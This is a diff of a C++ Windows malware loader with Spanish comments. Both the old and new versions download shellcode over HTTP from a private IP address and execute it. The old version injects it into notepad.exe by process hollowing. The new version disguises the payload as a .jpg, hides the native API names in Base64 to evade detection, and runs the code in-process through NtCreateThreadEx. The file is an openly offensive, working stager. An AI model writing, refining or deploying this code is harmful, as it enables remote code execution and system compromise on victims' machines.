@@ -1,14 +1,105 @@
-#include <stdio.h>
-#include <windows.h>
-#include <string.h>
-#include <winternl.h>
+#include <Windows.h>
 #include <winhttp.h>
 #include <iostream>
 #include <vector>
+#include <string>
 
-// Función para descargar un archivo binario (shellcode) desde un servidor
-std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
-    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+#pragma comment(lib, "winhttp.lib")
+
+#define NtCurrentProcess() ((HANDLE)-1)
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(WINAPI* _NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(WINAPI* _NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS(WINAPI* _NtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+
+// Función para decodificar Base64
+std::string Base64Decode(const std::string& encoded) {
+    std::string decoded;
+    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int in_len = encoded.size();
+    int i = 0;
+    int in_ = 0;
+    unsigned char char_array_4[4], char_array_3[3];
+    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
+        char_array_4[i++] = encoded[in_];
+        in_++;
+        if (i == 4) {
+            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+            for (i = 0; i < 3; i++) decoded += char_array_3[i];
+            i = 0;
+        }
+    }
+    if (i) {
+        for (int j = i; j < 4; j++) char_array_4[j] = 0;
+        for (int j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        for (int j = 0; j < i - 1; j++) decoded += char_array_3[j];
+    }
+    return decoded;
+}
+
+// Función para convertir std::string a std::wstring
+std::wstring StringToWString(const std::string& str) {
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstrTo(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
+
+// Cargar funciones de ntdll manualmente, pero cargando ntdll.dll sin codificar
+HMODULE LoadNTDLLFunctions(_NtAllocateVirtualMemory& NtAllocateVirtualMemory, _NtProtectVirtualMemory& NtProtectVirtualMemory, _NtCreateThreadEx& NtCreateThreadEx, _NtWaitForSingleObject& NtWaitForSingleObject) {
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll"); // Cargando directamente ntdll.dll sin Base64
+    if (hNtdll) {
+        std::cout << "[+] ntdll.dll cargado correctamente\n";
+
+        NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, Base64Decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=").c_str());
+        if (!NtAllocateVirtualMemory) std::cerr << "[-] Error al cargar NtAllocateVirtualMemory\n";
+
+        NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, Base64Decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==").c_str());
+        if (!NtProtectVirtualMemory) std::cerr << "[-] Error al cargar NtProtectVirtualMemory\n";
+
+        NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, Base64Decode("TnRDcmVhdGVUaHJlYWRFeA==").c_str());
+        if (!NtCreateThreadEx) std::cerr << "[-] Error al cargar NtCreateThreadEx\n";
+
+        NtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddress(hNtdll, Base64Decode("TnRXYWl0Rm9yU2luZ2xlT2JqZWN0").c_str());
+        if (!NtWaitForSingleObject) std::cerr << "[-] Error al cargar NtWaitForSingleObject\n";
+
+        if (NtAllocateVirtualMemory && NtProtectVirtualMemory && NtCreateThreadEx && NtWaitForSingleObject) {
+            std::cout << "[+] Todas las funciones se cargaron correctamente\n";
+            return hNtdll;
+        }
+        else {
+            std::cerr << "[-] Error: No se pudieron cargar todas las funciones necesarias\n";
+        }
+    }
+    else {
+        std::cerr << "[-] Error: No se pudo cargar ntdll.dll\n";
+    }
+    return NULL;
+}
+
+// Cerrar handles de red
+void CloseHandles(HINTERNET hRequest, HINTERNET hConnect, HINTERNET hSession) {
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+
+// Descargar el código desde un servidor utilizando WinHTTP
+std::vector<BYTE> DownloadCode(LPCWSTR serverName, LPCWSTR objectName) {
+    std::wstring programStr = StringToWString(Base64Decode("QSBQcm9ncmFt")); // "A Program"
+    std::wstring methodStr = StringToWString(Base64Decode("R0VU")); // "GET"
+
+    HINTERNET hSession = WinHttpOpen(programStr.c_str(), WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return {};
 
     HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
@@ -17,22 +108,20 @@ std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
         return {};
     }
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, methodStr.c_str(), objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        CloseHandles(hRequest, hConnect, hSession);
         return {};
     }
 
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        CloseHandles(hRequest, hConnect, hSession);
         return {};
     }
 
     std::vector<BYTE> buffer;
     DWORD dwSize = 0, dwDownloaded = 0;
+
     do {
         WinHttpQueryDataAvailable(hRequest, &dwSize);
         if (dwSize > 0) {
@@ -42,101 +131,63 @@ std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
         }
     } while (dwSize > 0);
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    CloseHandles(hRequest, hConnect, hSession);
 
     return buffer;
 }
 
-int main(int argc, char* argv[]) {
+// Ejecutar el código descargado
+bool ExecuteCode(PVOID BaseAddress, const std::vector<BYTE>& code, _NtAllocateVirtualMemory NtAllocateVirtualMemory, _NtProtectVirtualMemory NtProtectVirtualMemory, _NtCreateThreadEx NtCreateThreadEx, _NtWaitForSingleObject NtWaitForSingleObject) {
+    HANDLE hHostThread = INVALID_HANDLE_VALUE;
+    SIZE_T codeSize = code.size();
+    DWORD OldProtect = 0;
 
-    // URL del servidor y del archivo test.bin que contiene el shellcode
-    std::wstring serverName = L"192.168.2.138";
-    std::wstring objectName = L"/test.bin";  // Ruta del shellcode en el servidor
-    
-    // Descargar shellcode desde el servidor
-    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());
+    NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) return false;
 
-    if (shellcode.empty()) {
-        std::cerr << "Error al descargar el shellcode.\n";
+    memcpy(BaseAddress, code.data(), codeSize);
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &codeSize, PAGE_EXECUTE_READ, &OldProtect);
+    if (!NT_SUCCESS(status)) return false;
+
+    status = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (!NT_SUCCESS(status)) return false;
+
+    return true;
+}
+
+int main() {
+    std::wstring serverName = L"192.168.2.139";
+    std::wstring objectName = L"/1.jpg";
+    std::vector<BYTE> downloadedCode = DownloadCode(serverName.c_str(), objectName.c_str());
+
+    if (downloadedCode.empty()) {
+        std::cerr << "Error: Download failed.\n";
         return 1;
     }
 
-    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
-    PROCESS_INFORMATION procInfo;
+    PVOID BaseAddress = NULL;
+    _NtAllocateVirtualMemory NtAllocateVirtualMemory;
+    _NtProtectVirtualMemory NtProtectVirtualMemory;
+    _NtCreateThreadEx NtCreateThreadEx;
+    _NtWaitForSingleObject NtWaitForSingleObject;
 
-    // Crear un proceso suspendido
-    printf("[+] Creating Notepad.exe as Suspended Process.\n");
-    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
-
-    // Obtener el contexto del hilo del proceso suspendido
-    printf("[+] Getting Current Context.\n");
-    LPCONTEXT threadContext = new CONTEXT();
-    threadContext->ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(procInfo.hThread, threadContext)) {
-        printf("[-] Error getting context\n");
-        return 0;
+    HMODULE hNtdll = LoadNTDLLFunctions(NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject);
+    if (!hNtdll) {
+        std::cerr << "Error: Failed to load functions.\n";
+        return 1;
     }
 
-    // Obtener la dirección base del proceso suspendido
-    PVOID baseAddress;
-
-#ifdef _X86_ 
-    ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &baseAddress, sizeof(PVOID), NULL);
-#endif
-
-#ifdef _WIN64
-    ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
-#endif
-
-    // Obtener la dirección de NtUnmapViewOfSection y desmapear todas las secciones
-    printf("[+] Unmapping the Memory Section of Target Process.\n");
-    HMODULE ntdllHandle = GetModuleHandleA("ntdll");
-    FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
-    _NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
-    if (ntUnmapViewOfSection(procInfo.hProcess, baseAddress)) {
-        printf("[-] Error to unmap the Section\n");
-        return 0;
+    if (!ExecuteCode(BaseAddress, downloadedCode, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject)) {
+        std::cerr << "Execution failed.\n";
+        FreeLibrary(hNtdll);
+        return 1;
     }
 
-    // Asignar memoria en el proceso suspendido para el shellcode descargado
-    printf("[+] Allocating memory for shellcode.\n");
-    PVOID allocatedMemory = VirtualAllocEx(procInfo.hProcess, baseAddress, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!allocatedMemory) {
-        printf("[-] Error allocating memory in the target process.\n");
-        return 0;
+    std::cout << "[+] Código ejecutado en el hilo. Manteniendo el proceso activo...\n";
+    while (true) {
+        Sleep(1000); // Mantiene el proceso corriendo y revisa cada segundo
     }
 
-    // Escribir el shellcode descargado en la memoria asignada del proceso suspendido
-    printf("[+] Writing shellcode to the target process memory.\n");
-    if (!WriteProcessMemory(procInfo.hProcess, allocatedMemory, shellcode.data(), shellcode.size(), NULL)) {
-        printf("[-] Error writing shellcode to the process memory.\n");
-        return 0;
-    }
-
-    // Ajustar el punto de entrada al shellcode
-#ifdef _X86_
-    threadContext->Eax = (DWORD)allocatedMemory;
-#endif
-#ifdef _WIN64
-    threadContext->Rcx = (DWORD64)allocatedMemory;
-#endif
-
-    // Establecer el contexto del hilo del proceso con el nuevo punto de entrada
-    printf("[+] Setting the thread context to the shellcode entry point.\n");
-    if (!SetThreadContext(procInfo.hThread, threadContext)) {
-        printf("[-] Error setting the thread context.\n");
-        return 0;
-    }
-
-    // Reanudar el proceso suspendido para ejecutar el shellcode
-    printf("[+] Resuming the thread to execute the shellcode.\n");
-    if (!ResumeThread(procInfo.hThread)) {
-        printf("[-] Error resuming the thread.\n");
-        return 0;
-    }
-
-    printf("[+] Process Hollowing with remote shellcode injection completed.\n");
+    FreeLibrary(hNtdll);
     return 0;
 }
